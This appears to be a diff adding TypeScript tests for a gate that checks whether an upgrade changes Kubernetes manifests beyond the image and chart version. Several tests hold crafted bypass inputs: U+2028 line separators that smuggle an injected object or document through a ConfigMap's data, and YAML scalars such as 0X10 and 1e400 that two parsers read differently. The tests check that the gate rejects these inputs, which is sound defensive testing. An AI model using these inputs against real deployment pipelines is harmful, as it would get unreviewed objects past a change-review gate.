+    expect(manifestsDiffer(deploy(OLD, '1.0.0') + netpol, deploy(NEW, '1.1.0') + netpol, MOVE, ACME)).toBe(
+      'NetworkPolicy ns/lockdown names a version label at spec.podSelector.matchLabels["app.kubernetes.io/version"], and the chart\'s version labels change',
+    );
+  });
+
+  it('holds a container left on the old image, and one pair’s image in another’s place', () => {
+    const two = (a: string, b: string) =>
+      deploy(a, '1.0.0').replace(
+        `          image: ${a}\n`,
+        `          image: ${a}\n        - name: side\n          image: ${b}\n`,
+      );
+    expect(manifestsDiffer(two(OLD, OLD), two(NEW, OLD), MOVE)).toBe(
+      'the manifests change beyond the image: Deployment ns/app at spec.template.spec.containers[1].image',
+    );
+    const OTHER = { from: `docker.io/acme/side:1@sha256:${hex('c')}`, to: `docker.io/acme/side:2@sha256:${hex('d')}` };
+    expect(manifestsDiffer(two(OLD, OTHER.from), two(OTHER.to, NEW), [...MOVE, OTHER])).toBe(
+      'the manifests change beyond the image: Deployment ns/app at spec.template.spec.containers[0].image',
+    );
+    expect(manifestsDiffer(two(OLD, OTHER.from), two(NEW, OTHER.to), [...MOVE, OTHER])).toBeUndefined();
+  });
+
+  it('holds a key that is no string, which could stand for another of the same text', () => {
+    const svc = (selector: string) =>
+      `apiVersion: v1\nkind: Service\nmetadata: {name: s, namespace: ns}\nspec:\n  selector: ${selector}\n`;
+    expect(manifestsDiffer(svc('{"1": safe}'), svc('{1: other, "1": safe}'), [])).toMatch(/a key that is not a string/);
+    expect(manifestsDiffer(svc('{"1": safe}'), svc('{0x1: other, "1": safe}'), [])).toMatch(
+      /a key that is not a string/,
+    );
+    // YAML 1.2 reads `yes` as a key of its own, a difference; YAML 1.1 as true, no string.
+    expect(manifestsDiffer(svc('{"true": safe}'), svc('{yes: other, "true": safe}'), [])).toBe(
+      'the manifests change beyond the image: Service ns/s at spec.selector.yes',
+    );
+    expect(objectsOf(svc('{yes: other, "true": safe}'), '1.1')).toMatch(/a key that is not a string/);
+  });
+});
+
+// The independent read of #1065: the gate rendered a chart otherwise than Argo CD, so a template that branches on the
+// namespace, the cluster's APIs or a chart's crds/ could hide an object from it. It renders as Argo CD does now.
+describe('a chart rendered as Argo CD renders it', () => {
+  const ROOT = join(import.meta.dirname, '..');
+
+  it("passes helm Argo CD's arguments: the release, the namespace, the cluster's version and APIs, and the crds/", () => {
+    const chart: Chart = { ...GRAFANA, release: 'grafana', namespace: 'telemetry' };
+    expect(helmTemplateArgs(chart, '/r', '1.37.2', ['v1', 'argoproj.io/v1alpha1/Rollout'])).toEqual([
+      'template',
+      'grafana',
+      'grafana',
+      '--repo',
+      GRAFANA.repo,
+      '--version',
+      '13.5.0',
+      '--namespace',
+      'telemetry',
+      '--kube-version',
+      '1.37.2',
+      '--values',
+      '/r/deploy/base/telemetry/values/grafana.yaml',
+      '--api-versions',
+      'v1',
+      '--api-versions',
+      'argoproj.io/v1alpha1/Rollout',
+      '--include-crds',
+    ]);
+    expect(helmTemplateArgs({ ...chart, skipCrds: true }, '/r')).not.toContain('--include-crds');
+  });
+
+  it("renders every chart main runs in its Application's namespace, for the k3s main pins, with main's record", () => {
+    const items = inventory(ROOT).items;
+    const charts = items.filter((item) => item.chart && item.file.startsWith('deploy/'));
+    expect(charts.length).toBeGreaterThan(5);
+    for (const item of charts) expect(item.chart?.namespace, item.name).toMatch(/^[a-z][a-z0-9-]*$/);
+    expect(kubeVersionOf(items)).toMatch(/^\d+\.\d+\.\d+$/);
+    const apiVersions = apiVersionsOf(ROOT) ?? [];
+    // Argo CD's own list, from platform's cluster: the core group, its kinds, and the CRDs main's charts install.
+    for (const api of ['v1', 'v1/ConfigMap', 'apps/v1/Deployment', 'argoproj.io/v1alpha1/Rollout', 'kyverno.io/v1'])
+      expect(apiVersions).toContain(api);
+  });
+});
+
+// The second independent read of #1065: a character the cluster's reader takes as a line break that the gate's does
+// not (U+2028 in a block scalar) let a ConfigMap's data carry another object's keys past the gate. A rendering now holds
+// unless every character is one both read alike.
+describe('a rendering the gate and the cluster read alike, character by character', () => {
+  const OLD = `docker.io/acme/app:1.0.0@sha256:${hex('a')}`;
+  const NEW = `docker.io/acme/app:1.1.0@sha256:${hex('b')}`;
+  const MOVE = [{ from: OLD, to: NEW }];
+  const cm = (lines: string) => `apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: cfg\n  namespace: ns\n${lines}`;
+  const base = cm('data:\n  note: "hello"\n');
+  const at = (code: number) => String.fromCodePoint(code);
+  const breaks = { [at(0x2028)]: 'U+2028', [at(0x2029)]: 'U+2029', '\u0085': 'U+0085' };
+
+  it("holds the reader's two cases: another object's keys, or a document, in a ConfigMap's data", () => {
+    const LS = at(0x2028);
+    const block = cm(
+      `data:\n  note: |\n    hello${LS}kind: Marker${LS}metadata:${LS}  name: injected${LS}  namespace: ns\n`,
+    );
+    const quoted = cm(
+      `data:\n  note: "hello${LS}---${LS}apiVersion: v1${LS}kind: Marker${LS}metadata:${LS}  name: injected"\n`,
+    );
+    expect(manifestsDiffer(base, block, MOVE)).toBe(
+      'at the head, the rendering writes U+2028 at line 8, which readers may read apart',
+    );
+    expect(manifestsDiffer(base, quoted, MOVE)).toBe(
+      'at the head, the rendering writes U+2028 at line 7, which readers may read apart',
+    );
+  });
+
+  it('holds each line break but LF wherever it is written: data, a quoted scalar, a comment, a key, an annotation', () => {
+    for (const [character, name] of Object.entries(breaks)) {
+      const places = [
+        cm(`data:\n  note: |\n    a${character}b\n`),
+        cm(`data:\n  note: "a${character}b"\n`),
+        cm(`# a${character}b\ndata:\n  note: a\n`),
+        cm(`data:\n  "a${character}b": a\n`),
+        cm('data:\n  note: a\n').replace(
+          '  namespace: ns\n',
+          `  namespace: ns\n  annotations: { x: "a${character}b" }\n`,
+        ),
+      ];
+      for (const head of places) expect(manifestsDiffer(base, head, MOVE)).toContain(`writes ${name} at line`);
+    }
+    // And a carriage return, a control, the byte order mark, a lone surrogate: what is not allowed holds.
+    for (const [character, name] of [
+      ['\r', 'U+000D'],
+      ['\u0007', 'U+0007'],
+      [at(0xfeff), 'U+FEFF'],
+      ['\ud800', 'U+D800'],
+    ] as const)
+      expect(manifestsDiffer(base, cm(`data:\n  note: "a${character}b"\n`), MOVE)).toContain(`writes ${name} at`);
+    // The base is read the same way.
+    expect(manifestsDiffer(cm(`data:\n  note: "a${at(0x2028)}b"\n`), base, MOVE)).toMatch(
+      /^at the base, the rendering writes U\+2028/,
+    );
+  });
+
+  it('reads tab, LF and the printable characters both readers read alike', () => {
+    const head = cm('data:\n  note: "tab\there, café, 日本, 🙂,  "\n');
+    expect(strangeCharacter(head)).toBeUndefined();
+    expect(manifestsDiffer(base, head, MOVE)).toBeUndefined();
+  });
+});
+
+// The gate's reader and the cluster's resolve some plain scalars apart (`0X10` a string to one and 16 to the other,
+// `1e400` and `9e999` Infinity to one and two strings to the other), so two texts the object rule reads alike can run
+// apart. Outside the exempt places, every line must be the base's.
+describe('the text outside the exempt places', () => {
+  const OLD = `docker.io/acme/app:1.0.0@sha256:${hex('a')}`;
+  const NEW = `docker.io/acme/app:1.1.0@sha256:${hex('b')}`;
+  const MOVE = [{ from: OLD, to: NEW }];
+  const deployment = (image: string, labels = '', env = '') => `---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web
+  namespace: ns
+spec:
+  selector:
+    matchLabels:
+      app: web
+  template:
+    metadata:
+      labels:
+        app: web${labels}
+      annotations:
+        checksum/config: ${image === OLD ? 'aaa' : 'bbb'}
+    spec:
+      containers:
+        - name: web
+          image: ${image}${env}
+`;
+  const service = (selector: string) =>
+    `---\napiVersion: v1\nkind: Service\nmetadata:\n  name: web\n  namespace: ns\nspec:\n  selector:\n    ${selector}\n  ports:\n    - port: 80\n`;
+  const policy = (key: string) =>
+    `---\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata:\n  name: fence\n  namespace: ns\nspec:\n  podSelector:\n    matchLabels:\n      ${key}: locked\n  policyTypes: [Ingress, Egress]\n`;
+  const configMap = (data: string, after = '') =>
+    `---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: cfg\n  namespace: ns\ndata:\n${data}${after}`;
+  const line = (n: number, text: string) =>
+    `outside a ConfigMap's data and the checksums, the head's line ${n} is not the base's line ${n}: ${text}`;
+
+  it('holds each scalar the readers resolve apart, which the object rule reads alike', () => {
+    const cases: [string, string, string, string][] = [
+      // [what, base, head, the head's line]
+      [
+        'a Service selector key',
+        deployment(OLD) + service('"0X10": web'),
+        deployment(NEW) + service('0X10: web'),
+        '0X10: web',
+      ],
+      ['a NetworkPolicy key', deployment(OLD) + policy("'0O17'"), deployment(NEW) + policy('0O17'), '0O17: locked'],
+      [
+        'a selector value',
+        deployment(OLD) + service('tier: 1e400'),
+        deployment(NEW) + service('tier: 9e999'),
+        'tier: 9e999',
+      ],
+      [
+        'an env value',
+        deployment(OLD, '', '\n          env:\n            - name: MODE\n              value: 1.0e+400'),
+        deployment(NEW, '', '\n          env:\n            - name: MODE\n              value: 7e400'),
+        'value: 7e400',
+      ],
+      ['a pod label key', deployment(OLD, '\n        "0B11": x'), deployment(NEW, '\n        0B11: x'), '0B11: x'],
+    ];
+    for (const [what, base, head, text] of cases) {
+      // The object rule alone, as YAML 1.2 and 1.1, reads no difference: the text rule is what holds it.
+      for (const version of ['1.2', '1.1'] as const) {
+        const [a, b] = [objectsOf(base, version), objectsOf(head, version)];
+        if (typeof a === 'string' || typeof b === 'string') throw new Error(`${what}: ${a} ${b}`);
+        expect([...a.keys()], what).toEqual([...b.keys()]);
+      }
+      const verdict = manifestsDiffer(base, head, MOVE) ?? '';
+      expect(verdict.slice(-text.length - 2), what).toBe(`: ${text}`);
+    }
+    // A numeric key the object rule already holds, and one it reads as a string, which the text rule holds.
+    expect(manifestsDiffer(deployment(OLD) + service('"1": web'), deployment(NEW) + service('1: web'), MOVE)).toMatch(
+      /a key that is not a string/,
+    );
+    expect(
+      manifestsDiffer(deployment(OLD) + service('"1e_3": web'), deployment(NEW) + service('1e_3: web'), MOVE),
+    ).toBe(line(29, '1e_3: web'));
+  });
+
+  it("sets aside a ConfigMap's data and a pod template's checksum lines by the parser's offsets, and compares the rest", () => {
+    const base = deployment(OLD) + configMap('  a: |\n    one\n\n    two\n', 'binaryData: {}\n');
+    // The data's every line, a blank one inside its block scalar too, and the checksum's value: none is compared.
+    expect(
+      manifestsDiffer(
+        base,
+        deployment(NEW) + configMap('  a: |\n    one\n    two\n\n    three\n  b: x\n', 'binaryData: {}\n'),
+        MOVE,
+      ),
+    ).toBeUndefined();
+    // The line after the place, a blank one at its edge, and a comment past its end are compared.
+    expect(
+      manifestsDiffer(base, deployment(NEW) + configMap('  a: |\n    one\n\n    two\n', '\nbinaryData: {}\n'), MOVE),
+    ).toBe(line(32, ''));
+    expect(
+      manifestsDiffer(base, deployment(NEW) + configMap('  a: |\n    one\n\n    two\n', '# x\nbinaryData: {}\n'), MOVE),
+    ).toBe(line(32, '# x'));
+    // The line that opens it, `data:`, is compared; a key's own header inside it is data.
+    const opened = deployment(NEW) + configMap('  a: |-\n    one\n\n    two\n', 'binaryData: {}\n');
+    expect(manifestsDiffer(base, opened, MOVE)).toBeUndefined();
+    expect(manifestsDiffer(base, opened.replace('\ndata:\n', '\ndata: # c\n'), MOVE)).toBe(line(27, 'data: # c'));
+    // Data in a flow mapping on the `data:` line: that line opens and closes it, and is compared.
+    const flow = (value: string) => deployment(OLD) + configMap('', '').replace('\ndata:\n', `\ndata: {a: ${value}}\n`);
+    expect(manifestsDiffer(flow('1'), flow('2').replace(OLD, NEW).replace('aaa', 'bbb'), MOVE)).toBe(
+      line(27, 'data: {a: 2}'),
+    );
+    // A checksum among other annotations on one line, and one on the object's own metadata, are lines like any other.
+    const inline = (sum: string) =>
+      deployment(OLD).replace(
+        '      annotations:\n        checksum/config: aaa',
+        `      annotations: {checksum/config: ${sum}, x: y}`,
+      );
+    expect(manifestsDiffer(inline('aaa'), inline('bbb').replace(OLD, NEW), MOVE)).toBe(
+      line(15, 'annotations: {checksum/config: bbb, x: y}'),
+    );
+    const own = (sum: string) =>
+      deployment(OLD).replace('  namespace: ns\n', `  namespace: ns\n  annotations:\n    checksum/config: ${sum}\n`);
+    expect(manifestsDiffer(own('aaa'), own('bbb').replace(OLD, NEW), MOVE)).toMatch(
+      /at metadata\.annotations\["checksum\/config"\]$/,
+    );
+  });
+
+  it("finds a place by the parser, never by the text: `data:` written in another object's value is compared", () => {
+    const secretish = (value: string) =>
+      `${deployment(OLD)}---\napiVersion: v1\nkind: Secret\nmetadata:\n  name: s\n  namespace: ns\nstringData:\n  data: |\n    ${value}\n`;
+    expect(manifestsDiffer(secretish('a'), secretish('b').replace(OLD, NEW), MOVE)).toMatch(/at stringData\.data$/);
+    // A ConfigMap's `data` read by the parser where a search of the text would not: after a comment, in quotes.
+    const quoted = (value: string) =>
+      `${deployment(OLD)}---\napiVersion: v1\nkind: ConfigMap\nmetadata: {name: c, namespace: ns}\n"data": # here\n  k: ${value}\n`;
+    expect(manifestsDiffer(quoted('a'), quoted('b').replace(OLD, NEW).replace('aaa', 'bbb'), MOVE)).toBeUndefined();
+  });
+
+  it("writes a version label's line alike only for a value the object rule saw move as the chart's, in its own quotes", () => {
+    const CHART = { chart: 'c', from: '1.0.0', to: '1.1.0' };
+    const labelled = (value: string, image = OLD) =>
+      deployment(image).replace(
+        '        app: web\n',
+        `        app: web\n        app.kubernetes.io/version: ${value}\n`,
+      );
+    expect(manifestsDiffer(labelled('1.0.0'), labelled('1.1.0', NEW), MOVE, CHART)).toBeUndefined();
+    expect(manifestsDiffer(labelled('"1.0.0"'), labelled('"1.1.0"', NEW), MOVE, CHART)).toBeUndefined();
+    // Infinity to the gate at both, two strings to the cluster: the label moves nowhere the object rule sees.
+    expect(manifestsDiffer(labelled('1e400'), labelled('9e999', NEW), MOVE, CHART)).toBe(
+      line(15, 'app.kubernetes.io/version: 9e999'),
+    );
+    // The same string to the gate, 16 to sigs.k8s.io/yaml.
+    expect(manifestsDiffer(labelled('"0X10"'), labelled('0X10', NEW), MOVE, CHART)).toBe(
+      line(15, 'app.kubernetes.io/version: 0X10'),
+    );
+    // A moved value in other quotes, or with a comment after it, is another line.
+    expect(manifestsDiffer(labelled('"1.0.0"'), labelled('1.1.0', NEW), MOVE, CHART)).toBe(
+      line(15, 'app.kubernetes.io/version: 1.1.0'),
+    );
+    expect(manifestsDiffer(labelled('1.0.0'), labelled('1.1.0 # x', NEW), MOVE, CHART)).toBe(
+      line(15, 'app.kubernetes.io/version: 1.1.0 # x'),
+    );
+  });
+
+  it("compares a version label's line that writes anything after its value, or names a label outside the chart's move", () => {
+    // A flow mapping that goes on after the label: the rest of the line is compared.
+    const flow = (x: string, image = OLD) =>
+      deployment(image).replace(
+        '        app: web\n',
+        `        app: web\n        other: {\n          app.kubernetes.io/version: "1.0", x: ${x}}\n`,
+      );
+    expect(manifestsDiffer(flow('"0X10"'), flow('0X10', NEW), MOVE)).toBe(
+      line(16, 'app.kubernetes.io/version: "1.0", x: 0X10}'),
+    );
+    // A nodeSelector keyed by a version label, in a move of the image alone: nothing moved, so nothing is written alike.
+    const selected = (value: string, image = OLD) =>
+      `${deployment(image)}      nodeSelector:\n        app.kubernetes.io/version: ${value}\n`;
+    expect(manifestsDiffer(selected('1e400'), selected('9e999', NEW), MOVE)).toBe(
+      line(22, 'app.kubernetes.io/version: 9e999'),
+    );
+  });
+
+  it('sets aside a moved reference only whole: never one that begins, ends or carries it', () => {
+    const [FROM, TO] = ['docker.io/acme/app:1.1', 'docker.io/acme/app:1.2'];
+    const CHART = { chart: 'app', from: '1.0.0', to: '1.1.0' };
+    const operator = (image: string, extra: string) =>
+      `apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: operator\n  namespace: ns\nspec:\n  template:\n    spec:\n      containers:\n        - name: operator\n          image: ${image}\n${extra}`;
+    const env = (value: string) => `          env:\n            - name: SIDECAR_IMAGE\n              value: ${value}\n`;
+    const args = (value: string) => `          args: ["--sidecar=${value}"]\n`;
+    const judge = (was: string, now: string) => manifestsDiffer(was, now, [{ from: FROM, to: TO }], CHART);
+    // Another tag that begins with the old one, in an env value and in an argument.
+    expect(judge(operator(FROM, env(`${FROM}0`)), operator(TO, env(`${TO}0`)))).toMatch(
+      /Deployment ns\/operator at spec\.template\.spec\.containers\[0\]\.env\[0\]\.value$/,
+    );
+    expect(judge(operator(FROM, args(`${FROM}0`)), operator(TO, args(`${TO}0`)))).toMatch(
+      /containers\[0\]\.args\[0\]$/,
+    );
+    // A tag with a suffix (`-alpine`, `_debug`), and the same reference under another registry's path or name.
+    expect(judge(operator(FROM, env(`${FROM}_debug`)), operator(TO, env(`${TO}_debug`)))).toMatch(/env\[0\]\.value$/);
+    expect(judge(operator(FROM, env(`my_${FROM}`)), operator(TO, env(`my_${TO}`)))).toMatch(/env\[0\]\.value$/);
+    expect(judge(operator(FROM, env(`${FROM}-alpine`)), operator(TO, env(`${TO}-alpine`)))).toMatch(/env\[0\]\.value$/);
+    expect(judge(operator(FROM, env(`mirror.io/${FROM}`)), operator(TO, env(`mirror.io/${TO}`)))).toMatch(
+      /env\[0\]\.value$/,
+    );
+    // The reference whole, in a value, after `=`, or quoted: the moved image, set aside.
+    expect(judge(operator(FROM, env(FROM)), operator(TO, env(TO)))).toBeUndefined();
+    expect(judge(operator(FROM, args(FROM)), operator(TO, args(TO)))).toBeUndefined();
+    // A digest alone, as a value's move writes it, and after `@`; never one a longer digest begins with.
+    const [A, B] = [`sha256:${hex('a')}`, `sha256:${hex('b')}`];
+    const pinned = [{ from: `${FROM}@${A}`, to: `${TO}@${B}` }];
+    const digest = (image: string, d: string) =>
+      operator(image, `          env:\n            - name: D\n              value: ${d}\n`);
+    expect(manifestsDiffer(digest(`${FROM}@${A}`, A), digest(`${TO}@${B}`, B), pinned, CHART)).toBeUndefined();
+    expect(
+      manifestsDiffer(digest(`${FROM}@${A}`, `x@${A}`), digest(`${TO}@${B}`, `x@${B}`), pinned, CHART),
+    ).toBeUndefined();
+    expect(manifestsDiffer(digest(`${FROM}@${A}`, `${A}0`), digest(`${TO}@${B}`, `${B}0`), pinned, CHART)).toMatch(
+      /env\[0\]\.value$/,
+    );
+    // Another algorithm's digest after `@` is a digest alone too.
+    const [C, D] = [`sha512:${'c'.repeat(128)}`, `sha512:${'d'.repeat(128)}`];
+    const other = [{ from: `${FROM}@${C}`, to: `${TO}@${D}` }];
+    expect(
+      manifestsDiffer(digest(`${FROM}@${C}`, `x@${C}`), digest(`${TO}@${D}`, `x@${D}`), other, CHART),
+    ).toBeUndefined();
+  });
+
+  it("moves a chart's version label only whole: `x-1.1` to `x-1.2` never covers `x-1.10` to `x-1.20`", () => {
+    const X = { chart: 'x', from: '1.1', to: '1.2' };
+    const labelled = (own: string, other: string) =>
+      `apiVersion: v1\nkind: Service\nmetadata:\n  name: s\n  labels:\n    helm.sh/chart: ${own}\n  annotations:\n    note: ${other}\n`;
+    expect(manifestsDiffer(labelled('x-1.1', 'x-1.10'), labelled('x-1.2', 'x-1.20'), [], X)).toBe(
+      'the manifests change beyond the image: Service s at metadata.annotations.note',
+    );
+    // A chart whose name ends like a version (`foo-v2`): its own label at another version is still its own.
+    const FOO = { chart: 'foo-v2', from: '1.1', to: '1.2' };
+    expect(manifestsDiffer(labelled('foo-v2-1.10', 'a'), labelled('foo-v2-1.20', 'a'), [], FOO)).toBe(
+      'the manifests change beyond the image: Service s at metadata.labels["helm.sh/chart"]: foo-v2-1.20 is not foo-v2-1.2',
+    );
+    // A label of the chart's own name at another version is the chart's, never a subchart's.
+    expect(manifestsDiffer(labelled('x-1.10', 'a'), labelled('x-1.20', 'a'), [], X)).toMatch(
+      /x-1\.20 is not x-1\.2|forward on its major|chart at another version/,
+    );
   });
 });
